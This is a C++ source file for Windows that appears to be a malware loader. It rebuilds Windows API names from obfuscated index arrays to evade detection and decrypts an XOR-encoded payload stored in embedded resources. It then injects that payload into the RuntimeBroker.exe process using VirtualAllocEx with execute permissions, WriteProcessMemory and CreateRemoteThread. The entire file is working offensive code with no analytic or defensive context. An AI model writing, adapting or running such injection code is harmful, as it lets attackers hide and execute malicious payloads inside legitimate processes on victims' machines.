#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")
#include <tlhelp32.h>
#include <string>

std::string getoriginal(int offsets[], char* big_string, int sizeof_offset){  // Use std::string
    std::string empty_string= "";
    for (int i = 0; i < sizeof_offset / 4; ++i) {
         char character = big_string[offsets[i]];
         empty_string += character;
     }
     return empty_string;
}

void loadkumres(const char* rssssame, char** data, DWORD* size) {
    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.\\:";
    int ws_lld_ker_32[] = {10, 4, 17, 13, 4, 11, 55, 54, 62, 3, 11, 11};
    int get_mod_han[] = {32, 4, 19, 38, 14, 3, 20, 11, 4, 33, 0, 13, 3, 11, 4};
    int fin_res[] = {31, 8, 13, 3, 43, 4, 18, 14, 20, 17, 2, 4};
    int loa_res[] = {37, 14, 0, 3, 43, 4, 18, 14, 20, 17, 2, 4};
    int loc_res[] = {37, 14, 2, 10, 43, 4, 18, 14, 20, 17, 2, 4};
    int siz_res[] = {44, 8, 25, 4, 14, 5, 43, 4, 18, 14, 20, 17, 2, 4};
    HMODULE istfromKe__ws_ls_32 = LoadLibraryA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)).c_str());
    auto pGetModuleHandle = (HMODULE(WINAPI*)(LPCSTR))GetProcAddress(istfromKe__ws_ls_32, getoriginal(get_mod_han, big_string, sizeof(get_mod_han)).c_str());
    auto pFindResource = (HRSRC(WINAPI*)(HMODULE, LPCSTR, LPCSTR))GetProcAddress(istfromKe__ws_ls_32, getoriginal(fin_res, big_string, sizeof(fin_res)).c_str());
    FARPROC pLoadResource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(loa_res, big_string, sizeof(loa_res)).c_str());
    auto pLockResource = (char*(WINAPI*)(HGLOBAL))GetProcAddress(istfromKe__ws_ls_32, getoriginal(loc_res, big_string, sizeof(loc_res)).c_str());
    FARPROC pSizeofResource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(siz_res, big_string, sizeof(siz_res)).c_str());
    HMODULE hModule = ((HMODULE(WINAPI*)(LPCSTR))pGetModuleHandle)(NULL);
    HRSRC hResource = ((HRSRC(WINAPI*)(HMODULE, LPCSTR, LPCSTR))pFindResource)(hModule, rssssame, RT_RCDATA);

    HGLOBAL hResData = ((HGLOBAL(WINAPI*)(HMODULE, HRSRC))pLoadResource)(hModule, hResource);
    *size = ((DWORD(WINAPI*)(HMODULE, HRSRC))pSizeofResource)(hModule, hResource);
    *data = (char*)((char*(WINAPI*)(HGLOBAL))pLockResource)(hResData);
}

int main() {
    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.\\:";
    int ws_lld_ker_32[] = {10, 4, 17, 13, 4, 11, 55, 54, 62, 3, 11, 11};
    HMODULE istfromKe__ws_ls_32 = LoadLibraryA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)).c_str());
    
    char* kkeyakesey;
    DWORD kkeyakeseyLen;
    loadkumres("dhanushkey1", &kkeyakesey, &kkeyakeseyLen);

    char* kkcode;
    DWORD kkcodeLen;
    loadkumres("dhanushcode56", &kkcode, &kkcodeLen);
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    int create_snap[] = { 28, 17, 4, 0, 19, 4, 45, 14, 14, 11, 7, 4, 11, 15, 55, 54, 44, 13, 0, 15, 18, 7, 14, 19 };
    FARPROC pcreate_snap = GetProcAddress(istfromKe__ws_ls_32, getoriginal(create_snap, big_string, sizeof(create_snap)).c_str());
    HANDLE snapshot = ((HANDLE(WINAPI*)(DWORD, DWORD))pcreate_snap)(TH32CS_SNAPPROCESS, 0);

    int run_timeb[] = {43, 20, 13, 19, 8, 12, 4, 27, 17, 14, 10, 4, 17, 62, 4, 23, 4};
    const char *procmantar = getoriginal(run_timeb, big_string, sizeof(run_timeb)).c_str();

    int proc_firs[] = {41, 17, 14, 2, 4, 18, 18, 55, 54, 31, 8, 17, 18, 19};
    int proc_Nex[] = {41, 17, 14, 2, 4, 18, 18, 55, 54, 39, 4, 23, 19};
    int open_proc[] = {40, 15, 4, 13, 41, 17, 14, 2, 4, 18, 18};
    int virtu_all[] = {47, 8, 17, 19, 20, 0, 11, 26, 11, 11, 14, 2, 30, 23};
    FARPROC pPro_firs = GetProcAddress(istfromKe__ws_ls_32, getoriginal(proc_firs, big_string, sizeof(proc_firs)).c_str());
    FARPROC pPro_nex = GetProcAddress(istfromKe__ws_ls_32, getoriginal(proc_Nex, big_string, sizeof(proc_Nex)).c_str());
    FARPROC popen_proc = GetProcAddress(istfromKe__ws_ls_32, getoriginal(open_proc, big_string, sizeof(open_proc)).c_str());
    FARPROC pvirall = GetProcAddress(istfromKe__ws_ls_32, getoriginal(virtu_all, big_string, sizeof(virtu_all)).c_str());

    ((BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32))pPro_firs)(snapshot, &pe32);
    while(((BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32))pPro_nex)(snapshot, &pe32)) {
       if (strcmp(pe32.szExeFile, procmantar) == 0){
              HANDLE hProcess = ((HANDLE(WINAPI*)(DWORD, BOOL, DWORD))popen_proc)(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
              
              LPVOID clamonua = ((LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))pvirall)(hProcess, NULL, kkcodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
              //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
              for (DWORD ma1su = 0; ma1su < kkcodeLen; ma1su++) {
               kkcode[ma1su] ^= kkeyakesey[ma1su % kkeyakeseyLen]; 
          }

             int write_procM[] = {48, 17, 8, 19, 4, 41, 17, 14, 2, 4, 18, 18, 38, 4, 12, 14, 17, 24};
             int creat_rem_th[] = {28, 17, 4, 0, 19, 4, 43, 4, 12, 14, 19, 4, 45, 7, 17, 4, 0, 3};
             int wait_obj[] = {48, 0, 8, 19, 31, 14, 17, 44, 8, 13, 6, 11, 4, 40, 1, 9, 4, 2, 19};
             FARPROC pwrite_procM = GetProcAddress(istfromKe__ws_ls_32, getoriginal(write_procM, big_string, sizeof(write_procM)).c_str());
             FARPROC pcreat_rem_th = GetProcAddress(istfromKe__ws_ls_32, getoriginal(creat_rem_th, big_string, sizeof(creat_rem_th)).c_str());
             FARPROC pwait_obj = GetProcAddress(istfromKe__ws_ls_32, getoriginal(wait_obj, big_string, sizeof(wait_obj)).c_str()); 
             
             ((BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))pwrite_procM)(hProcess, clamonua, kkcode, kkcodeLen, NULL);
             
             HANDLE tHandle = ((HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))pcreat_rem_th)(hProcess , NULL, 0, (LPTHREAD_START_ROUTINE)clamonua, NULL, 0, NULL);
             ((DWORD(WINAPI*)(HANDLE, DWORD))pwait_obj)(tHandle, INFINITE);
             
             int virtu_fre[] = {47, 8, 17, 19, 20, 0, 11, 31, 17, 4, 4, 30, 23};
             FARPROC pvirtu_fre = GetProcAddress(istfromKe__ws_ls_32, getoriginal(virtu_fre, big_string, sizeof(virtu_fre)).c_str());
             ((BOOL(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD))pvirtu_fre)(hProcess, clamonua, 0, MEM_RELEASE);
             
              break;
         }
      }

    return 0;
}